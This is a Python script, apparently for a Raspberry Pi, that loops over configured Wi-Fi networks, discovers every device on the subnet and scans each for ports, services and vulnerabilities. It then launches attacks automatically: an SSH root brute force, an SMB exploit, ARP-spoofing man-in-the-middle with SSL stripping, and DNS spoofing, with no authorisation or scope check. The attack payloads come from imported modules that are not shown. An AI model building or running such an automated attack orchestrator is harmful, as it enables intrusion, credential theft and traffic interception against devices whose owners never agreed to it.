import time
import json
import re
from datetime import datetime, timedelta
import network_module
import network_analysis_module
import wifi_security
import bluetooth_scan
import network_enhancements
import utils
import asyncio
import os
import advanced_attacks

CONFIG_FILE = "/home/pi/scout_partner/config.json"
WAIT_TIME = 15 * 60  # 15 minutes in seconds

network_configs = utils.load_config(CONFIG_FILE)
last_scan_time = {}
scanned_ips = set()  # Track already scanned IPs

def sanitize_ssid(ssid):
    """Sanitize the SSID to be file-system friendly."""
    return re.sub(r'[^a-zA-Z0-9_-]', '_', ssid)

def load_existing_results(file_path):
    """Load existing scan results from the file if it exists."""
    try:
        with open(file_path, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return []

def find_existing_device(ip, results):
    """Find an existing device by IP in the results."""
    for device in results:
        if device.get("ip") == ip:
            return device
    return None

def device_data_changed(new_data, existing_data):
    """Check if new device data differs from the existing data."""
    for key, value in new_data.items():
        if existing_data.get(key) != value:
            return True
    return False

async def connect_and_scan(network):
    ssid = network['SSID']
    sanitized_ssid = sanitize_ssid(ssid)
    file_path = f"/home/pi/scout_partner/scan_results_{sanitized_ssid}.json"
    ip_tracking_path = f"/home/pi/scout_partner/scan_results_{sanitized_ssid}_ips.json"

    print(f"Attempting to connect to {ssid}...")

    if network_module.connect_to_wifi(ssid, network['Password']):
        print(f"Connected to {ssid}. Starting data collection...\n")

        # Load previously scanned IPs from the IP tracking file
        if os.path.exists(ip_tracking_path):
            with open(ip_tracking_path, "r") as ip_file:
                scanned_ips = set(json.load(ip_file))
        else:
            scanned_ips = set()

        # Load existing results from the full scan data file for incremental saves
        results = load_existing_results(file_path)

        # Discover devices on the network
        print("Discovering devices on the network...")
        discovered_devices = network_analysis_module.discover_devices_on_network("192.168.1.0/24")
        print("Discovered devices:", discovered_devices, "\n")

        for device in discovered_devices:
            ip = device['ip']
            hostname = device['hostname']

            # Skip device if it is the scanning device or already in scanned_ips
            if hostname == 'pi.lan' or ip in scanned_ips:
                print(f"Skipping {ip} ({hostname}) - either scanning device or already fully scanned.\n")
                continue

            print(f"Starting in-depth scans on device {ip} ({hostname})...")
            scanned_ips.add(ip)  # Add to the set to skip in future scans within this session

            # Perform in-depth scans and gather data
            new_device_data = {
                "ssid": ssid,
                "ip": ip,
                "hostname": hostname,
                "open_ports": network_enhancements.scan_ports(ip),
                "os_and_services": network_enhancements.fingerprint_os_service(ip),
                "vulnerabilities": network_enhancements.vulnerability_scan(ip),
                "rogue_services": network_enhancements.detect_rogue_services(ip, uncommon_ports="1025-5000")
            }

            # Trigger advanced attacks and capture results
            attack_results = trigger_advanced_attacks(ip, new_device_data)
            new_device_data.update({"advanced_attacks": attack_results})

            # Update existing data or add new entry
            existing_device_data = find_existing_device(ip, results)
            if existing_device_data:
                existing_device_data.update(new_device_data)
            else:
                results.append(new_device_data)

            # Incremental save after each device update in the full scan file
            with open(file_path, "w") as file:
                json.dump(results, file, indent=4)
            print(f"Incremental save: Scan results for {ip} saved to {file_path}\n")

        # Save the updated scanned IPs to the IP tracking file
        with open(ip_tracking_path, "w") as ip_file:
            json.dump(list(scanned_ips), ip_file, indent=4)
        print(f"Updated IP tracking file for {ssid} saved to {ip_tracking_path}")

        # Final SSID-level save with completed data
        results[0].update({
            "status": "Scan completed",
            "discovered_devices": discovered_devices,
            "wifi_security_info": await wifi_security.check_security(ssid),
            "network_scan_data": await network_analysis_module.perform_advanced_nmap_scan(network.get('TargetIP', '192.168.1.1')),
            "bluetooth_devices": bluetooth_scan.scan_bluetooth()
        })

        with open(file_path, "w") as file:
            json.dump(results, file, indent=4)
        print(f"Final save: Completed scan results for SSID {ssid} saved to {file_path}")

        # Disconnect from the network after the scan
        print("Disconnecting from Wi-Fi...")
        network_module.disconnect_wifi()
        print(f"Completed scans for {ssid}\n")
        return True
    else:
        print(f"Failed to connect to {ssid}\n")
        return False

def trigger_advanced_attacks(ip, device_data):
    """Determine which advanced attacks to run based on open ports and services and return attack results."""
    open_ports = device_data.get("open_ports", [])
    attack_results = {}

    if 22 in open_ports:
        print(f"SSH detected on {ip}. Initiating brute-force attempt.")
        brute_force_result = advanced_attacks.brute_force_service(ip, "ssh", "root", "/path/to/password_list.txt")
        attack_results["ssh_brute_force"] = brute_force_result

    if 445 in open_ports:
        print(f"SMB detected on {ip}. Attempting SMB exploit.")
        smb_exploit_result = advanced_attacks.smb_exploit(ip)
        attack_results["smb_exploit"] = smb_exploit_result

    if 80 in open_ports or 443 in open_ports:
        print(f"HTTP/HTTPS detected on {ip}. Starting MITM attack with SSL strip.")
        mitm_result = advanced_attacks.start_mitm_arp_spoof(ip, "192.168.1.1")
        ssl_strip_result = advanced_attacks.ssl_strip()
        attack_results["mitm"] = mitm_result
        attack_results["ssl_strip"] = ssl_strip_result

    if 53 in open_ports:
        print(f"DNS detected on {ip}. Starting DNS spoofing attack.")
        dns_spoof_result = advanced_attacks.dns_spoof("example.com", "10.0.0.1")
        attack_results["dns_spoof"] = dns_spoof_result

    # Return structured attack results to save in the JSON file
    return attack_results

async def main():
    if not network_configs:
        print("No network configurations found. Exiting.")
        return

    while True:
        for network in network_configs:
            ssid = network['SSID']
            last_scanned = last_scan_time.get(ssid)
            if last_scanned and datetime.now() - last_scanned < timedelta(seconds=WAIT_TIME):
                print(f"Skipping {ssid} - recently scanned.")
                continue

            success = await connect_and_scan(network)
            if success:
                print(f"Completed scans for {ssid}")
                last_scan_time[ssid] = datetime.now()

if __name__ == "__main__":
    asyncio.run(main())
